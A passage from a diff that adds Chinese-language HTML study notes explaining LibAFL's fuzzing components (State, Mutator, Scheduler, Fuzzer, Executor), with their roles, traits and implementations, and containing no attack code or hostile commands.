+<li><code>verify_timeouts</code>: 重新运行超时输入以确认是否为真挂起 (通常配合 <code>CaptureTimeoutFeedback</code>)。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>二、 其他相关定义</strong></p>
+<ul>
+<li><strong><code>Structs</code> (结构体)</strong>:
+<ul>
+<li><code>ClosureStage</code>: 允许通过一个简单的闭包创建自定义 Stage。</li>
+<li><code>ExecutionCountRestartHelper</code> / <code>RetryCountRestartHelper</code>: 用于管理需要特定执行次数或重试次数的 Stage，尤其在可重启场景下。</li>
+<li><code>StageId</code>: Stage 的唯一标识符。</li>
+</ul>
+</li>
+<li><strong><code>Traits</code> (接口)</strong>:
+<ul>
+<li><code>Restartable</code>: 定义 Stage 在 Fuzzer 重启时的行为规范，以恢复进度。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>核心要点回顾</strong>:</p>
+<ul>
+<li><code>Stage</code> 是 Fuzzing 循环中执行具体 Fuzzing 技术的操作单元。</li>
+<li>LibAFL 提供多种预置 Stage，并允许用户自定义 Stage。</li>
+<li>Stage 的顺序通常很重要，不同 Stage 协同工作以实现 Fuzzing 目标。</li>
+<li>这种模块化设计使得用户可以灵活组合不同的技术来构建定制化的 Fuzzing 策略。</li>
+</ul>
+<h3 id="state">state</h3>
+<p><code>State</code> 是 LibAFL Fuzzing 框架的<strong>核心数据中心和状态管理器</strong>。它在整个 Fuzzing 运行期间负责<strong>跟踪、存储和管理所有动态数据、配置以及 Fuzzing 进度</strong>。几乎所有其他 LibAFL 组件（如 <code>Fuzzer</code> 核心、<code>EventManager</code>、<code>Executor</code>、<code>Feedback</code>、<code>Corpus</code>、<code>Mutator</code>、<code>Stage</code>）都会与 <code>State</code> 进行交互。</p>
+<p><strong><code>StdState</code> (标准状态实现)</strong>: 这是 LibAFL 中最常用、最标准的 <code>State</code> 具体实现。它包含 Fuzzing 运行所需的大部分标准组件和数据字段，例如：</p>
+<ul>
+<li><strong>随机数生成器 (<code>Rand</code>)</strong>: 为 Fuzzing 中的各种随机决策（选择输入、变异等）提供随机性。</li>
+<li><strong>主语料库 (<code>Corpus</code>)</strong>: 存储和管理那些被 <code>Feedback</code> 机制认为是“有趣”的、能够触发新行为或覆盖的测试用例。这是 Fuzzer “学习”的基础。</li>
+<li><strong>解决方案语料库 (<code>Solutions</code> corpus)</strong>: 专门用于存储那些导致目标程序崩溃、超时或其他被定义为“成功利用”或“目标达成”的输入。</li>
+<li><strong>执行次数 (<code>Executions</code>)</strong>: 记录 Fuzzer 已经执行测试用例的总次数。</li>
+<li><strong>Fuzzing 开始时间 (<code>StartTime</code>)</strong>: 记录 Fuzzing 会话的起始时间，用于计算运行总时长、执行速度等统计信息。</li>
+<li>元数据映射 (<code>MetadataMap</code>): 一个非常灵活的键值存储，允许不同的组件在 <code>State</code> 中存储和共享自定义的、与状态相关的附加信息。例如：
+<ul>
+<li><code>Tokens</code> (用户提供的或 Fuzzer 学习到的“魔法数”)。</li>
+<li><code>CmpLogObserver</code> 收集到的比较指令操作数值。</li>
+<li>其他特定 Stage 或 Feedback 可能需要的临时或持久化数据。</li>
+</ul>
+</li>
+<li><strong>当前测试用例信息</strong>: 存储当前正在被处理或 Fuzzing 的测试用例的相关信息。</li>
+<li><strong>最大输入大小 (<code>MaxSize</code>)</strong>: 控制 Fuzzer 处理的输入的最大允许大小。</li>
+</ul>
+<hr>
+<p><strong>核心 <code>State</code> 相关 Traits (接口/规范)</strong>:</p>
+<p>LibAFL 大量使用 Traits 来定义 <code>State</code> 应具备的能力或应提供的信息，从而实现模块化和解耦。组件通过请求实现了特定 Trait 的 <code>State</code> 来工作，而不是依赖于某个具体的 <code>State</code> 类型。</p>
+<ul>
+<li><code>HasCorpus</code>: 表明 <code>State</code> 拥有或可以访问一个主语料库。</li>
+<li><code>HasSolutions</code>: 表明 <code>State</code> 拥有或可以访问一个解决方案语料库。</li>
+<li><code>HasRand</code>: 表明 <code>State</code> 拥有或可以访问一个随机数生成器。</li>
+<li><code>HasExecutions</code>: 允许查询当前的执行次数。</li>
+<li><code>HasStartTime</code>: 允许查询 Fuzzing 的开始时间。</li>
+<li><code>HasMaxSize</code>: 允许查询和可能修改输入的最大大小。</li>
+<li><code>HasClientPerfMonitor</code> / <code>MaybeHasClientPerfMonitor</code>: 提供客户端性能监视器。</li>
+<li><code>HasCurrentStageId</code>: 跟踪当前执行的 Stage ID。</li>
+<li><code>HasCurrentTestcase</code>: 持有当前正在处理的测试用例信息。</li>
+<li><code>HasMetadata</code> (虽然未直接列在 <code>state</code> 模块顶级，但与 <code>MetadataMap</code> 紧密相关): 允许 <code>State</code> 存储和检索任意类型的元数据。</li>
+<li><code>Stoppable</code>: 为 <code>State</code> 或相关组件提供一个检查是否应停止 Fuzzing 的API。</li>
+</ul>
+<hr>
+<p><strong>其他相关结构体</strong>:</p>
+<ul>
+<li><code>LoadConfig</code>: 用于配置从磁盘加载初始种子时的选项。</li>
+<li><code>NopState</code>: 极简的状态实现，主要用于测试。</li>
+<li><code>StageStack</code>: 跟踪当前 Stage 的执行栈，用于处理嵌套 Stage。</li>
+</ul>
+<hr>
+<p><strong>核心要点回顾</strong>:</p>
+<ul>
+<li><code>State</code> 是 Fuzzing 过程中的<strong>单一事实来源 (Single Source of Truth)</strong>，集中管理所有重要数据。</li>
+<li><code>StdState</code> 是功能完备的标准实现，包含了大部分 Fuzzing 场景所需的字段和功能。</li>
+<li>通过<strong>Traits</strong> (如 <code>HasCorpus</code>, <code>HasRand</code>)，LibAFL 实现了组件与 <code>State</code> 之间的松耦合，增强了框架的模块化、灵活性和可扩展性。不同的组件只依赖于它们需要的 <code>State</code> 能力，而不是具体的 <code>State</code> 类型。</li>
+<li><code>MetadataMap</code> 为 <code>State</code> 提供了强大的扩展能力，允许动态添加和管理各种自定义数据。</li>
+</ul>
+<h3 id="mutator">Mutator</h3>
+<p><strong>核心作用</strong>: <code>Mutator</code> 是 LibAFL Fuzzing 框架中负责<strong>对输入进行修改和转换以产生新测试用例的组件</strong>。它们是 Fuzzer 探索程序状态空间、尝试触发新行为和发现漏洞的主要手段。</p>
+<p><strong>核心理念</strong>: 通过对现有输入应用一系列的变异操作，生成多样化的新输入，以期覆盖目标程序的更多代码路径并发现潜在的缺陷。</p>
+<hr>
+<p><strong>一、 <code>Mutator</code> Trait (核心接口)</strong></p>
+<ul>
+<li>定义了所有单一输入变异器的基本行为。</li>
+<li>主要方法是 <code>mutate(...)</code>，它接收当前状态、要变异的输入和随机数生成器，并返回一个 <code>MutationResult</code> (指示变异是否成功以及输入是否被修改)。</li>
+<li><code>MutatorsTuple</code> Trait: 允许将多个 <code>Mutator</code> 组合起来按顺序执行。</li>
+</ul>
+<hr>
+<p><strong>二、 主要的 <code>Mutator</code> 类型/模块</strong></p>
+<ul>
+<li><strong>基础/通用变异 (<code>libafl::mutators::mutations</code>)</strong>:
+<ul>
+<li>提供大量字节级的基本变异操作，如位翻转、字节翻转、算术变异、数据块操作（删除、复制、交换）、拼接等。</li>
+</ul>
+</li>
+<li><strong>Havoc 风格变异 (<code>libafl::mutators::havoc_mutations</code>)</strong>:
+<ul>
+<li>类似 AFL++ 的 Havoc 策略，组合多种基础变异，进行高随机性、高强度的变异，以快速产生差异较大的输入。</li>
+</ul>
+</li>
+<li><strong>基于 Token 的变异 (<code>libafl::mutators::token_mutations</code>)</strong>:
+<ul>
+<li>利用 Fuzzer 状态中存储的 &quot;tokens&quot;（字典、魔法数、关键词）来指导变异，如插入 Token 或用 Token 替换输入部分。对特定格式或协议的输入非常有效。</li>
+</ul>
+</li>
+<li><strong>调度型变异器 (<code>libafl::mutators::scheduled</code>)</strong>:
+<ul>
+<li><code>ScheduledMutator</code>: 内部可以包含一个变异器列表，并按某种策略（随机、顺序、权重）调度执行这些内部变异器，允许组合多种变异策略。</li>
+</ul>
+</li>
+<li><strong>MOpt 变异调度器 (<code>libafl::mutators::mopt_mutator</code>)</strong>:
+<ul>
+<li><code>StdMOptMutator</code>: (常用) AFL++ 中引入的高级变异调度器，基于粒子群优化思想，尝试学习并动态调整选择哪些基础变异算子更有效。</li>
+</ul>
+</li>
+<li><strong>语法感知型变异器</strong>:
+<ul>
+<li><code>gramatron</code>: 使用语法自动机进行变异，确保输入符合预定义语法。</li>
+<li><code>nautilus</code>: 另一个基于语法的 Fuzzer 的变异器。</li>
+</ul>
+</li>
+<li><strong>特定输入类型变异器</strong>:
+<ul>
+<li><code>encoded_mutations</code>: 针对 <code>EncodedInputs</code> (如 protobuf 编码的输入)。</li>
+<li><code>list</code>: 针对列表形式的输入 (<code>ListInputs</code>)。</li>
+<li><code>multi</code>: 针对由多个部分组成的输入 (<code>MultipartInputs</code>)。</li>
+<li><code>numeric</code>: 针对整数类型输入的变异。</li>
+<li><code>unicode</code>: 保留 Unicode 字符串类别的变异。</li>
+</ul>
+</li>
+<li><strong>辅助/包装型变异器</strong>:
+<ul>
+<li><code>grimoire</code>: 基于学习输入结构并生成符合该结构的输入的策略。</li>
+<li><code>hash</code>: 包装其他 Mutator，通过哈希比较确保输入确实发生改变。</li>
+<li><code>mapping</code>: 允许混合和匹配不同的 Mutator 和 Input 类型。</li>
+<li><code>tuneable</code>: <code>ScheduledMutator</code> 的扩展，允许运行时调整内部变异器的调度。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>三、 其他相关定义</strong></p>
+<ul>
+<li><strong><code>Structs</code> (结构体)</strong>:
+<ul>
+<li><code>BoolInvertMutator</code>: 反转布尔值的简单变异器。</li>
+<li><code>NopMutator</code>: “空操作”变异器，用于测试。</li>
+<li><code>MutationId</code>: 标识变异器元组中某个变异的索引。</li>
+</ul>
+</li>
+<li><strong><code>Enums</code> (枚举)</strong>:
+<ul>
+<li><code>MutationResult</code>: 表示变异操作的结果 (<code>Mutated</code>, <code>Skipped</code>, <code>Invalid</code>)。</li>
+</ul>
+</li>
+<li><strong><code>Traits</code> (接口)</strong>:
+<ul>
+<li><code>MultiMutator</code>: 一次接收一个输入，返回多个变异后输入的变异器。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>核心要点回顾</strong>:</p>
+<ul>
+<li><strong>生成新输入的引擎</strong>: <code>Mutator</code> 是 Fuzzing 过程中产生新测试用例的核心。</li>
+<li><strong>多样性</strong>: LibAFL 提供了从基础字节操作到高级上下文感知策略的丰富变异器。</li>
+<li><strong>组合与调度是关键</strong>: 通过 <code>ScheduledMutator</code>、<code>MutatorsTuple</code> 或像 <code>StdMOptMutator</code> 这样的高级调度器，可以将多种变异策略组合起来以增强效果。</li>
+<li><strong>上下文感知</strong>: 一些高级变异器会利用从 Fuzzing 过程中学习到的信息（如 Tokens、CmpLog 结果）来指导变异，使其更具目标性。</li>
+<li><strong>适应性</strong>: 针对不同的输入类型（如结构化数据、数值、字符串）和目标程序特性，选择或定制合适的变异器组合是提高 Fuzzing 效率的关键。</li>
+</ul>
+<h3 id="scheduler">scheduler</h3>
+<p><code>Scheduler</code> 决定了 Fuzzer <strong>如何以及按什么顺序从语料库 (<code>Corpus</code>) 中选择下一个测试用例 (Testcase) 进行 Fuzzing</strong>。一个好的调度策略能够显着影响 Fuzzing 的效率，它可以优先选择那些更有可能发现新代码路径或触发漏洞的输入。</p>
+<p><strong>核心理念</strong>: 通过智能地选择和排序语料库中的输入，最大化 Fuzzing 的效果，避免在低价值的输入上浪费过多的时间和计算资源。</p>
+<hr>
+<p><strong>一、 <code>Scheduler</code> Trait (核心接口)</strong></p>
+<ul>
+<li>定义了所有调度器的基本行为。</li>
+<li>核心方法是 <code>next()</code>，用于从语料库中请求下一个要处理的测试用例的索引。</li>
+<li>包含钩子方法，如 <code>on_add</code> (当新测试用例添加到语料库时调用)、<code>on_remove</code> (当测试用例从语料库移除时调用，需要实现 <code>RemovableScheduler</code> Trait)、<code>on_replace</code> (当测试用例被替换时调用，需要实现 <code>RemovableScheduler</code> Trait)，这些钩子允许调度器在语料库发生变化时收集数据或更新其内部状态，以支持复杂的调度算法。</li>
+</ul>
+<hr>
+<p><strong>二、 主要的 <code>Scheduler</code> 类型/模块</strong></p>
+<ul>
+<li><strong><code>queue</code> (队列调度器)</strong>:
+<ul>
+<li><strong>AFL 风格队列机制</strong>: 实现类似于经典 AFL 的队列机制，通常是先进先出 (FIFO) 或有一些简单的优先级策略。</li>
+<li>示例: <code>QueueScheduler</code> (虽然文档中未直接列出，但 <code>StdScheduler</code> 通常基于此)。</li>
+</ul>
+</li>
+<li><strong><code>powersched</code> (能量调度器)</strong>:
+<ul>
+<li><strong>基于能量分配</strong>: 结合“能量调度”(Power Schedules) 算法。这种算法会为语料库中的每个输入分配一定的“能量”，能量越高的输入会被更频繁地选中或进行更多的变异。能量的分配通常基于输入的效果（如发现新覆盖、执行时间等）。</li>
+<li>你的 Fuzzer 代码中，<code>PowerQueueScheduler</code> 就是这类调度器的代表。</li>
+</ul>
+</li>
+<li><strong><code>minimizer</code> (最小化调度器)</strong>:
+<ul>
+<li><strong>子集选择</strong>: 这类调度器只从整个语料库的一个子集中选择测试用例提供给 Fuzzer。</li>
+<li><strong>目的</strong>: 可能用于专注 Fuzzing 语料库中特定的一部分，或者与测试用例最小化策略配合，只使用最小化后的核心语料。</li>
+</ul>
+</li>
+<li><strong><code>accounting</code> (覆盖率审计调度器)</strong>:
+<ul>
+<li><strong>基于详细覆盖率分析</strong>: 这种调度器会进行更细致的覆盖率审计，以确保 Fuzzer 在所有已发现的路径上都花费了足够的精力，并优先探索那些能够覆盖到“稀有”或“昂贵”路径的输入。</li>
+<li>引用了 NDSS 的论文，表明其背后有学术研究支持。</li>
+</ul>
+</li>
+<li><strong><code>probabilistic_sampling</code> (概率采样调度器)</strong>:
+<ul>
+<li><strong>随机抽样</strong>: 从语料库中按一定概率随机抽取测试用例。可以引入更多随机性，但也可能不如基于覆盖率或能量的调度器高效。</li>
+</ul>
+</li>
+<li><strong><code>testcase_score</code> (测试用例评分)</strong>:
+<ul>
+<li><strong>为输入打分</strong>: 提供一种评估机制，为语料库中的每个条目（测试用例）打分。这个分数可以被其他调度器用来决定选择哪个输入。</li>
+</ul>
+</li>
+<li><strong><code>tuneable</code> (可调队列调度器)</strong>:
+<ul>
+<li><strong>扩展队列调度器</strong>: 在 AFL 风格队列调度器的基础上，增加了手动选择下一个语料库条目的方法，提供了更灵活的控制。</li>
+</ul>
+</li>
+<li><strong><code>weighted</code> (加权队列调度器)</strong>:
+<ul>
+<li><strong>AFL++ 风格</strong>: 类似于 AFL++ 中的加权队列，可能会根据输入的某些属性（如大小、发现时间、是否触发新行为等）给予不同的权重，影响其被选中的概率。</li>
+</ul>
+</li>
+<li><strong><code>RandScheduler</code> (随机调度器)</strong> (位于 <code>Structs</code>):
+<ul>
+<li><strong>纯随机选择</strong>: 简单地从语料库中随机选择一个测试用例。这是最基础的调度方式。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>三、 其他相关定义</strong></p>
+<ul>
+<li><strong><code>Traits</code> (接口)</strong>:
+<ul>
+<li><code>AflScheduler</code>: 为 AFL 风格的调度器定义通用的元数据操作。</li>
+<li><code>HasQueueCycles</code>: 标记那些跟踪“队列周期”（完整遍历一遍语料库的次数）的调度器。</li>
+<li><code>RemovableScheduler</code>: 扩展了 <code>Scheduler</code> Trait，增加了 <code>on_remove</code> 和 <code>on_replace</code> 钩子，用于在语料库条目被移除或替换时通知调度器。</li>
+</ul>
+</li>
+<li><strong><code>Functions</code> (函数)</strong>:
+<ul>
+<li><code>on_add_metadata_default</code>, <code>on_evaluation_metadata_default</code>, <code>on_next_metadata_default</code>: 这些可能是为 <code>Scheduler</code> Trait 中的钩子方法提供的默认实现或辅助函数，用于处理与测试用例元数据相关的操作。</li>
+</ul>
+</li>
+<li><strong><code>Type Aliases</code> (类型别名)</strong>:
+<ul>
+<li><code>StdScheduler</code>: <strong>LibAFL 中默认使用的标准调度器类型</strong>。它通常是一个经过良好配置和优化的调度器实现（例如，可能是基于队列和能量调度的组合）。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>核心要点回顾</strong>:</p>
+<ul>
+<li><code>Scheduler</code> 的核心任务是从语料库中<strong>选择下一个要 Fuzz 的输入</strong>。</li>
+<li>不同的调度策略会显着影响 Fuzzing 的方向和效率。</li>
+<li>LibAFL 提供了多种调度器实现，从简单的随机选择到复杂的基于能量、覆盖率审计或评分的策略。</li>
+<li>许多调度器通过实现 <code>Scheduler</code> Trait 中的钩子方法（如 <code>on_add</code>）来动态适应语料库的变化。</li>
+<li><code>StdScheduler</code> 是 LibAFL 推荐的默认调度器。</li>
+<li>你的 Fuzzer 中使用了 <code>IndexesLenTimeMinimizerScheduler</code> 包装 <code>PowerQueueScheduler</code>，这是一种结合了输入最小化、长度/时间考量以及能量调度的先进策略。</li>
+</ul>
+<h3 id="fuzzer">Fuzzer</h3>
+<p><code>Fuzzer</code> 结构体是整个 Fuzzing 活动 (fuzz campaign) 的<strong>主要控制中心和执行者</strong>。它将所有其他核心组件（如 <code>State</code>, <code>EventManager</code>, <code>Executor</code>, <code>Feedback</code>, <code>Scheduler</code>, <code>Stages</code>）有机地组织和驱动起来，以执行完整的 Fuzzing 循环。</p>
+<hr>
+<p><strong>一、 核心结构体 (<code>Structs</code>)</strong></p>
+<ul>
+<li><strong><code>StdFuzzer</code></strong>:
+<ul>
+<li><strong>描述</strong>: 这是 LibAFL 提供的<strong>默认、标准的 Fuzzer 实例</strong>，适用于大多数日常 Fuzzing 任务.</li>
+<li><strong>作用</strong>: 它封装了 Fuzzing 的主循环逻辑，包括从调度器 (<code>Scheduler</code>) 获取下一个要测试的输入，执行该输入（通过 <code>Executor</code>），评估执行结果（通过 <code>Feedback</code> 和 <code>Observers</code>），并将有趣的输入添加回语料库 (<code>Corpus</code>)。</li>
+</ul>
+</li>
+<li><strong><code>NopFuzzer</code></strong>:
+<ul>
+<li><strong>描述</strong>: 一个“空操作”的 Fuzzer，它不执行任何实际的 Fuzzing 操作.</li>
+<li><strong>作用</strong>: 主要用于测试或作为不需要实际 Fuzzing 时的占位符。</li>
+</ul>
+</li>
+<li><strong><code>BloomInputFilter</code></strong>:
+<ul>
+<li><strong>描述</strong>: 一种基于布隆过滤器 (Bloom Filter) 的输入过滤器，用于<strong>概率性地防止重复执行相同的输入</strong>.</li>
+<li><strong>作用</strong>: 布隆过滤器是一种空间效率高的数据结构，可以用来判断一个元素是否“可能”在一个集合中。在这里，它可以快速地判断一个输入是否与之前执行过的输入相似或相同，从而避免不必要的重复执行，提高 Fuzzing 效率。</li>
+</ul>
+</li>
+<li><strong><code>NopInputFilter</code></strong>:
+<ul>
+<li><strong>描述</strong>: 一个伪过滤器，它会允许执行每一个输入，即不进行任何过滤.</li>
+<li><strong>作用</strong>: 当不需要输入过滤功能时使用。</li>
+</ul>
+</li>
+<li><strong><code>ExecuteInputResult</code></strong>:
+<ul>
+<li><strong>描述</strong>: 表示执行一个输入后的结果，特别是指示这个输入应该被添加到哪个语料库。例如，是添加到主语料库还是解决方案语料库。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>二、 核心 Traits (接口/规范)</strong></p>
+<p>这些 Trait 定义了 <code>Fuzzer</code> 及其相关组件应具备的核心能力和职责。</p>
+<ul>
+<li><strong><code>Fuzzer</code></strong>:
+<ul>
+<li><strong>描述</strong>: <strong>最主要的 Fuzzer Trait</strong>，定义了 Fuzzer 的基本行为和驱动整个 Fuzzing 过程的能力。它通常包含启动 Fuzzing 循环 (<code>fuzz_loop</code>)、单步执行 (<code>fuzz_one</code>) 等核心方法。</li>
+</ul>
+</li>
+<li><strong><code>Evaluator</code> / <code>EvaluatorObservers</code></strong>:
+<ul>
+<li><strong>描述</strong>: <code>Evaluator</code> 定义了评估一个输入并相应修改 Fuzzer 状态的行为。<code>EvaluatorObservers</code> 可能是 <code>Evaluator</code> 的一个变种或辅助 Trait，强调了在评估过程中对观察者 (<code>Observers</code>) 的使用。</li>
+<li><strong>作用</strong>: 在输入执行后，根据 <code>Feedback</code> 和 <code>Observers</code> 的结果来判断输入是否有趣，并决定是否将其加入语料库、更新状态等。</li>
+</ul>
+</li>
+<li><strong><code>EventProcessor</code></strong>:
+<ul>
+<li><strong>描述</strong>: 定义了从 <code>EventManager</code> 接收事件并对其进行评估处理的能力。</li>
+<li><strong>作用</strong>: 在分布式或多进程 Fuzzing 中，Fuzzer 需要能够接收和处理来自其他 Fuzzer 实例或 Broker 的事件（如新的测试用例）。</li>
+</ul>
+</li>
+<li><strong><code>ExecutesInput</code></strong>:
+<ul>
+<li><strong>描述</strong>: 标记那些能够执行输入的结构体。</li>
+<li><strong>作用</strong>: <code>Fuzzer</code> 自身通常会实现这个 Trait，因为它负责驱动输入的执行。</li>
+</ul>
+</li>
+<li><strong><code>ExecutionProcessor</code></strong>:
+<ul>
+<li><strong>描述</strong>: 定义了使用 <code>Feedback</code> 来评估一个输入是否有趣的行为。</li>
+<li><strong>作用</strong>: 这是 <code>Fuzzer</code> 判断输入价值的核心逻辑部分，紧密关联 <code>Feedback</code> 机制。</li>
+</ul>
+</li>
+<li><strong><code>HasFeedback</code></strong>:
+<ul>
+<li><strong>描述</strong>: 表明一个结构体（通常是 <code>Fuzzer</code> 或 <code>State</code>）持有一个或多个 <code>Feedback</code> 实例。</li>
+</ul>
+</li>
+<li><strong><code>HasObjective</code></strong>:
+<ul>
+<li><strong>描述</strong>: 表明一个结构体持有一个“目标” Feedback (<code>ObjectiveFeedback</code>)。目标 Feedback 通常用于判断是否达到了 Fuzzing 的最终目标（如发现崩溃）。</li>
+</ul>
+</li>
+<li><strong><code>HasScheduler</code></strong>:
+<ul>
+<li><strong>描述</strong>: 表明一个结构体持有一个 <code>Scheduler</code> (调度器) 实例。调度器负责决定下一个应该从语料库中选择哪个输入进行 Fuzzing。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>核心要点回顾</strong>:</p>
+<ul>
+<li><code>Fuzzer</code> (特别是 <code>StdFuzzer</code>) 是 LibAFL 的<strong>指挥中心</strong>，它整合了所有其他组件（State, EventManager, Executor, Feedback, Scheduler, Stages）来执行 Fuzzing 任务。</li>
+<li>它负责驱动 Fuzzing 循环，包括选择输入、执行输入、评估结果、更新语料库和状态。</li>
+<li>通过一系列 Traits (如 <code>Evaluator</code>, <code>EventProcessor</code>, <code>ExecutesInput</code>)，<code>Fuzzer</code> 的行为和职责被清晰地定义和模块化。</li>
+<li>输入过滤器 (如 <code>BloomInputFilter</code>) 可以帮助提高效率，避免重复工作。</li>
+</ul>
+<h3 id="executors">executors</h3>
+<p><code>Executor</code> 是 LibAFL Fuzzing 框架中负责<strong>接收输入 (Input)，并在目标程序中实际执行这个输入</strong>的组件。它是 Fuzzer 与被测目标交互的桥梁，负责启动目标、传递输入、监控执行过程，并最终报告执行结果（如 <code>ExitKind</code>：正常退出、崩溃、超时等）。</p>
+<p><strong>核心理念</strong>: <code>Executor</code> 的核心任务是将 Fuzzer 生成的或选择的输入“喂”给目标程序，并观察其行为。LibAFL 提供了多种 <code>Executor</code> 实现，以适应不同的目标程序类型（如命令行工具、库函数、QEMU 模拟的程序）和不同的 Fuzzing 策略（如进程内执行、基于 fork/forkserver 的执行、差分 Fuzzing 等）。</p>
+<hr>
+<p><strong>一、 <code>Executor</code> Trait (核心接口)</strong></p>
+<ul>
+<li>定义了所有执行器的基本行为和契约。</li>
+<li>其核心方法通常是 <code>run_target(...)</code> 或类似名称，该方法接收一个输入，在目标程序中执行它，并返回一个 <code>ExitKind</code> 来指示执行是如何结束的。</li>
+</ul>
+<hr>
+<p><strong>二、 主要的 <code>Executor</code> 类型/模块</strong></p>
+<ol>
+<li><strong><code>inprocess</code> (进程内执行器)</strong>:
+<ul>
+<li><strong><code>InProcessExecutor</code></strong>: 类似 libFuzzer，直接在 Fuzzer 自身的进程空间内调用一个目标函数 (harness function)。</li>
+<li><strong>优点</strong>: 速度快，无进程切换开销。</li>
+<li><strong>缺点</strong>: 目标崩溃会导致 Fuzzer 进程一同崩溃，通常需要配合可重启的事件管理器 (<code>RestartingEventManager</code>)。</li>
+</ul>
+</li>
+<li><strong><code>inprocess_fork</code> (进程内 Fork 执行器)</strong>:
+<ul>
+<li><strong><code>GenericInProcessForkExecutor</code></strong>: 在每次执行 harness 函数前，Fuzzer 主进程会调用 <code>fork()</code> 创建一个子进程，实际的目标函数调用在子进程中进行。</li>
+<li><strong>优点</strong>: 目标崩溃仅影响子进程，主 Fuzzer 安全。</li>
+<li><strong>缺点</strong>: 每次 <code>fork()</code> 仍有开销，通常比 <code>forkserver</code> 慢。</li>
+</ul>
+</li>
+<li><strong><code>forkserver</code> (Forkserver 执行器)</strong>:
+<ul>
+<li><strong>AFL 经典模式</strong>: 目标程序启动后进入一个特殊的 &quot;forkserver&quot; 模式。Fuzzer 命令此服务器 <code>fork()</code> 子进程来执行每个输入。</li>
+<li><strong>优点</strong>: 目标程序的核心初始化仅发生一次，后续 <code>fork()</code> 开销极小，效率高。</li>
+<li><strong>适用性</strong>: 通常需要目标程序经过 AFL 工具链插桩以支持 forkserver。</li>
+</ul>
+</li>
+<li><strong><code>command</code> (命令执行器)</strong>:
+<ul>
+<li><strong>执行外部程序</strong>: 为每次运行启动一个独立的子程序（如命令行工具），通过标准输入、文件或命令行参数传递输入。</li>
+<li><strong>适用性</strong>: Fuzz 独立的命令行应用。</li>
+</ul>
+</li>
+<li><strong><code>differential</code> (差分执行器)</strong>:
+<ul>
+<li><strong>比较不同版本</strong>: 同时或先后执行两个或多个不同版本/配置的目标程序，并比较它们的行为差异。</li>
+<li><strong>目标</strong>: 发现回归性 bug 或版本间的行为不一致。</li>
+</ul>
+</li>
+<li><strong><code>combined</code> (组合执行器)</strong>:
+<ul>
+<li><strong><code>CombinedExecutor</code></strong>: 包装一个主执行器和一个次执行器，但次执行器不在 <code>run_target</code> 中执行。用于主副执行器逻辑分离的特定场景。</li>
+</ul>
+</li>
+<li><strong><code>shadow</code> (影子执行器)</strong>:
+<ul>
+<li><strong><code>ShadowExecutor</code></strong>: 包装一个主执行器，目的是配合一组**“影子观察者” (Shadow Observers)** 工作。</li>
+<li><strong>影子观察者</strong>: 任何标准的 <code>Observer</code> (如 <code>CmpLogObserver</code>) 都可以作为影子观察者，它们收集的信息<strong>不直接</strong>用于主 <code>Feedback</code> 循环的决策。</li>
+<li><strong>作用</strong>: 允许在不干扰核心 Fuzzing 逻辑的情况下，独立收集额外的、可能更专门或开销更大的观测数据（例如，<code>CmpLog</code> 数据用于指导后续变异）。</li>
+<li><strong>“影子”含义</strong>: 指的是一种并行但独立于主反馈决策流程的观察路径。</li>
+</ul>
+</li>
+<li><strong><code>hooks</code> (执行器钩子)</strong>:
+<ul>
+<li><strong>扩展执行流程</strong>: 提供在执行器运行 harness 函数之前和之后插入自定义代码的钩子点。</li>
+</ul>
+</li>
+<li><strong><code>sand</code> (SAND 执行器)</strong>:
+<ul>
+<li><strong>低开销污点分析解耦</strong>: 实现 SAND 技术，旨在将动态分析（如 Sanitizer）的开销与 Fuzzing 主循环分离开，以提高 Fuzzing 效率。</li>
+</ul>
+</li>
+<li><strong><code>with_observers</code> (带观察者的执行器包装器)</strong>:
+<ul>
+<li><strong>添加 <code>HasObservers</code> 能力</strong>: 包装任何 <code>Executor</code>，使其能够持有观察者元组 (<code>ObserversTuple</code>) 并实现 <code>HasObservers</code> Trait。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<p><strong>三、 核心枚举 (<code>Enums</code>)</strong></p>
+<ul>
+<li><strong><code>ExitKind</code></strong>:
+<ul>
+<li><strong>指示执行结果</strong>: 目标程序一次执行的结束状态。</li>
+<li><strong>常见类型</strong>: <code>Ok</code> (正常), <code>Crash</code> (崩溃), <code>Timeout</code> (超时), <code>OOM</code> (内存溢出)。</li>
+</ul>
+</li>
+<li><strong><code>DiffExitKind</code></strong>:
+<ul>
+<li><strong>用于差分 Fuzzing</strong>: 描述差分执行中某个版本的具体退出类型。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>四、 核心 Traits (接口/规范)</strong></p>
+<ul>
+<li><strong><code>Executor</code></strong>: 主要执行器接口，定义执行输入的核心功能。</li>
+<li><strong><code>ExecutorsTuple</code></strong>: 允许组合多个执行器。</li>
+<li><strong><code>HasObservers</code></strong>: 表明执行器持有观察者。<code>Executor</code> 在执行后会通知 <code>Observer</code> 收集信息。</li>
+<li><strong><code>HasTimeout</code></strong>: 允许获取或设置 <code>Executor</code> 的超时阈值。</li>
+</ul>
+<hr>
+<p><strong>五、 辅助函数 (<code>Functions</code>)</strong></p>
+<ul>
+<li><code>common_signals</code>: 可能包含 Fuzzer 希望处理的常见操作系统信号列表。</li>
+</ul>
+<hr>
+<p><strong>核心要点回顾</strong>:</p>
+<ul>
+<li><code>Executor</code> 是<strong>实际运行目标程序并应用输入</strong>的组件。</li>
+<li>LibAFL 提供多种 <code>Executor</code> 以适应不同目标和策略。</li>
+<li><code>ExitKind</code> 是报告执行结果的关键。</li>
+<li><code>Executor</code> 与 <code>Observers</code> 紧密协作，在执行后由 <code>Observers</code> 收集数据。</li>
+<li><code>forkserver</code> vs <code>inprocess_fork</code>:
+<ul>
+<li><code>inprocess_fork</code>: Fuzzer 主进程每次都 <code>fork()</code>，子进程调用 harness。</li>
+<li><code>forkserver</code>: 目标程序自身变成 fork 服务器，Fuzzer 命令它 <code>fork()</code>，初始化开销小，效率通常更高。</li>
+</ul>
+</li>
+<li><code>ShadowExecutor</code> 与 <code>Shadow Observers</code>:
+<ul>
+<li><code>ShadowExecutor</code> 允许一组“影子观察者”独立于主反馈循环收集额外数据。</li>
